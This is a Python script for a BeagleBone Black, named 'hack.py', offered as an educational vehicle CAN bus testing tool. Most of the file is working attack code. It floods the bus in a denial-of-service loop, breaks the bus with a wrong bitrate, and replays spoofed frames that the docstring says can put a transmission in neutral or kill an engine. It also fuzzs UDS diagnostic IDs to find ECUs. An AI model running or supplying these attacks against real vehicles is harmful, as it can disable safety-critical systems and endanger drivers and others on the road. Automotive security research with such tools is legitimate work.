#!/usr/bin/python3
"""
'hack.py' is a vehicle vulnerability testing program written for the Beaglebone Black SBC

The program comes with:
    - Logger : Logs CAN frames to a file for further deconstruction
    - Denial : A Denial of Service (DoS) attack for testing vehicle operation when the bus becomes inoperative
    - IdRep : Spoofs frames to control certain aspects of a car. Everything from changing values on the dash cluster
              to controlling the transmission and killing a car engine
    - Bus_Fuzz : Sends Unified Diagnostic Service (UDS) frames to find ECUs that can be further deconstructed.
    - Corrupt : Another form of DoS attack that destroys the CAN bus by using the wrong bitrate. Only useful on vehicles
                without relay units to test incoming frames.

Disclaimer(s): This is an educational tool and is not meant for malicious intent. It should be noted that fuzzing the
CAN bus while a vehicle's engine is running can destroy the vehicle. There are reports of people blowing their engines
up because of this. Frames should be logged with the logger and replayed using canplayer on VCAN1 to cansniffer running
on CAN1 in color mode to reverse engineer the proprietary CAN database your vehicle is using before using IdRep mode to
test frames. Denial, Corrupt, and Bus_Fuzz should be used when the engine is off to help mitigate unexpected situations.

This was tested on an Arduino/BBB tester CAN bus, 2010 Chevy Colorado, and a 2008 Honda Civic.
"""

import os
import datetime
import Adafruit_BBIO.GPIO as GPIO
from time import sleep
from pyvit import can
from pyvit.hw import socketcan
from pyvit.proto.uds import UDSInterface
from pyvit.proto.isotp import IsotpInterface
from pyvit import log


'''
Variables for IdRep, change here not in the main loop
'''
idrep_arbid = 0x00C
idrep_data = [0xFF] * 8
idrep_sleep = 0.1

'''
Variables for Bus Fuzz, change here not in the main loop
'''
fuzz_start = 0x100
fuzz_stop = 0x800


dev = None  # SocketCAN interface
isotp = None
uds = None  # UDS service
logger = None  # CAN Bus logging

button_logger = "P8_12"
button_denial = "P8_14"
button_idrep = "P8_16"
button_bus_fuzz = "P8_18"
button_corrupt = "P8_26"
led_red = "P8_7"
led_green = "P8_8"
led_blue = "P8_10"

off = [0, 0, 0]
blue = [0, 0, 1]
green = [0, 1, 0]
cyan = [0, 1, 1]
red = [1, 0, 0]
magenta = [1, 0, 1]
yellow = [1, 1, 0]
white = [1, 1, 1]


def setup_io():
    """
    Used to setup pins on the BBB.
    """
    print("Setting up I/O")
    script_io = """
    sudo config-pin -a P9_26 can
    sudo config-pin -a P9_24 can
    sudo config-pin -a P8_7 gpio
    sudo config-pin -a P8_8 gpio
    sudo config-pin -a P8_10 gpio
    sudo config-pin -a P8_12 gpio
    sudo config-pin -a P8_14 gpio
    sudo config-pin -a P8_16 gpio
    sudo config-pin -a P8_18 gpio
    sudo config-pin -a P8_26 gpio
    """
    os.system("bash -c '%s'" % script_io)
    GPIO.setup(led_red, GPIO.OUT)
    GPIO.setup(led_green, GPIO.OUT)
    GPIO.setup(led_blue, GPIO.OUT)
    GPIO.setup(button_logger, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.add_event_detect(button_logger, GPIO.FALLING)
    GPIO.setup(button_denial, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.add_event_detect(button_denial, GPIO.FALLING)
    GPIO.setup(button_idrep, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.add_event_detect(button_idrep, GPIO.FALLING)
    GPIO.setup(button_bus_fuzz, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.add_event_detect(button_bus_fuzz, GPIO.FALLING)
    GPIO.setup(button_corrupt, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.add_event_detect(button_corrupt, GPIO.FALLING)
    sleep(2)


def kill_interfaces():
    """
    Brings down the can and vcan interfaces for changes
    """
    # print("Killing interfaces for sanity sake")
    script_kill = """
    sudo ifconfig can1 down
    sudo ifconfig vcan1 down
    """
    os.system("bash -c '%s'" % script_kill)


def setup_interfaces():
    """
    Sets up the CAN interfaces over socketCan using system messages.
    These cannot be set with pyvit or socketCan in python and must be
    taken outside to a bash script.
    """
    kill_interfaces()
    print("Setting up CAN interfaces")
    script_interfaces = """
    sudo modprobe can
    sudo modprobe can-dev
    sudo modprobe can-raw
    sudo modprobe vcan
    sudo ip link set can1 up type can bitrate 250000
    sudo ifconfig can1 down
    sudo ifconfig can1 txqueuelen 1000
    sudo ifconfig can1 up
    sudo ip link add dev vcan1 type vcan
    sudo ip link set up vcan1
    sudo ip link show can1
    sudo ip link show vcan1
    """
    os.system("bash -c '%s'" % script_interfaces)
    global dev
    dev = socketcan.SocketCanDev("can1")
    sleep(1)


def run_corrupt():
    """
    A less usable attack where we corrupt the CAN bus by using the wrong
    bitrate. It works on any CAN bus that does not use relays to check for
    bitrate before sending the payload to other systems. Noticeably this works
    on cars older than 2008 before CAN became standard in the early adopters. This
    also works in our test system due to us not using a relay system.
    """
    print("Running corruption attack")
    change_script = """
    sudo ifconfig can1 down
    sudo ip link set can1 up type can bitrate 500000 restart-ms 1
    sudo ifconfig can1 up
    """
    os.system("bash -c '%s'" % change_script)
    run_denial(True)  # Just need to send a dummy frame to start, denial frames work fine
    # Need to reset the CAN interface to change the bitrate back
    sleep(1)
    kill_interfaces()
    sleep(1)
    setup_io()
    setup_interfaces()
    sleep(1)


def run_denial(is_corrupt):
    """
    Floods the bus with a FULL line meaning no information can
    be sent. Effectively killing the bus.
    """
    if not is_corrupt:
        print("Running DoS (Denial of Service) attack")
    dev.start()
    frame = can.Frame(0)
    frame.data = [0, 0, 0, 0, 0, 0, 0, 0]
    while True:
        dev.send(frame)
        if GPIO.input(button_denial) == 0 or GPIO.input(button_corrupt) == 0:
            sleep(0.5)
            break
    dev.stop()


def run_id_rep(arbid, payload, sleep_time):
    """
    A simple attack that sends a payload to the ID requested.
    This can be used to control various systems on the connected
    CAN bus. Everything from a dash cluster to putting the transmission
    in Nuetral given we know the right information.
    :param arbid: ID we are targeting
    :param payload: Payload to send on the bus
    :param sleep_time: Time between messages, we don't want to spam the bus
    """
    print("Running ID replication attack with frame: " + str(hex(arbid)) + "#" + str(payload) + " with a delay of "
          + str(sleep_time) + "s")
    dev.start()
    frame = can.Frame(arbid)
    frame.data = payload
    while True:
        dev.send(frame)
        sleep(sleep_time)
        if GPIO.input(button_idrep) == 0:
            sleep(0.5)
            break
    dev.stop()


def run_bus_iterator(start, stop, file_name):
    """
    Only works on a physical vehicle.
    By iterating through the IDs and sending off UDS frames we can
    find ECU IDs that can be further checked for vulnerabilities
    :param start: Beginning HEX value
    :param stop: Ending HEX value
    :param file_name: File to output found IDs to
    """
    print("Running Bus Fuzzing")
    print("Fuzzing the bus from ID" + str(hex(start)) + " to ID" + str(hex(stop)) + " for ECU Diagnostic Session")
    print("Logging fuzz to: " + file_name)
    dev.start()
    global uds
    uds = UDSInterface(dev)
    with open(file_name, 'a') as tmp:
        for i in range(start, stop):
            response = uds.request(i, timeout=0.2)
            if response is not None:
                print("ECU response for ID 0x%X found" % i)
                tmp.write(str(datetime.datetime.now()) + '  ID0x%X\n' % i)
            if GPIO.input(button_bus_fuzz) == 0:
                tmp.close()
                sleep(0.5)
                break
        tmp.close()
    dev.stop()


def run_logger(file_name):
    """
    Logs all data on the CAN bus
    :param file_name: Output file
    """
    print("Starting log session...")
    print("Logging dump to: " + file_name)
    dev.start()
    global logger
    logger = log.Logger(filename=file_name, if_name='can1')
    logger.start()
    while True:
        logger.log_frame(dev.recv())
        if GPIO.input(button_logger) == 0:
            sleep(0.5)
            break
    logger.stop()
    dev.stop()


def set_rgb(val):
    if val[0] == 1:
        GPIO.output(led_red, GPIO.HIGH)
    else:
        GPIO.output(led_red, GPIO.LOW)
    if val[1] == 1:
        GPIO.output(led_green, GPIO.HIGH)
    else:
        GPIO.output(led_green, GPIO.LOW)
    if val[2] == 1:
        GPIO.output(led_blue, GPIO.HIGH)
    else:
        GPIO.output(led_blue, GPIO.LOW)


def main():
    try:
        print("Running hack.py")
        if dev is None:
            setup_io()
            setup_interfaces()
        set_rgb(white)
        test_val = 0
        print("Setup complete. Waiting for button press.")
        while True:
            # button_val = GPIO.event_detected(button_start)
            set_rgb(green)
            if GPIO.input(button_logger) == 0 or test_val == 1:
                print("Running Logger")
                set_rgb(blue)
                sleep(1)
                run_logger('/var/lib/cloud9/candump_' + str(datetime.datetime.now()) + "_log.csv")
                set_rgb(green)
                print("Back at main menu. Waiting for button press.")
                sleep(1)
            elif GPIO.input(button_denial) == 0 or test_val == 2:
                print("Running Denial")
                set_rgb(red)
                sleep(1)
                run_denial(False)
                set_rgb(green)
                print("Back at main menu. Waiting for button press.")
                sleep(1)
            elif GPIO.input(button_idrep) == 0 or test_val == 3:
                print("Running ID Rep")
                set_rgb(yellow)
                sleep(1)
                run_id_rep(idrep_arbid, idrep_data, idrep_sleep)
                set_rgb(green)
                print("Back at main menu. Waiting for button press.")
                sleep(1)
            elif GPIO.input(button_bus_fuzz) == 0 or test_val == 4:
                print("Running Bus Fuzzing")
                set_rgb(cyan)
                sleep(1)
                run_bus_iterator(fuzz_start, fuzz_stop, '/var/lib/cloud9/fuzzdump_'
                                 + str(datetime.datetime.now()) + '_log.txt')
                set_rgb(green)
                print("Back at main menu. Waiting for button press.")
                sleep(1)
            elif GPIO.input(button_corrupt) == 0 or test_val == 5:
                print("Running corrupt")
                set_rgb(magenta)
                sleep(1)
                run_corrupt()
                set_rgb(green)
                print("Back at main menu. Waiting for button press.")
                sleep(1)
    except KeyboardInterrupt:
        print("\nSomething killed the script, terminating connections")
        kill_interfaces()
        if dev is not None:
            dev.stop()
        if logger is not None:
            logger.stop()
        set_rgb(off)


if __name__ == "__main__":
    main()
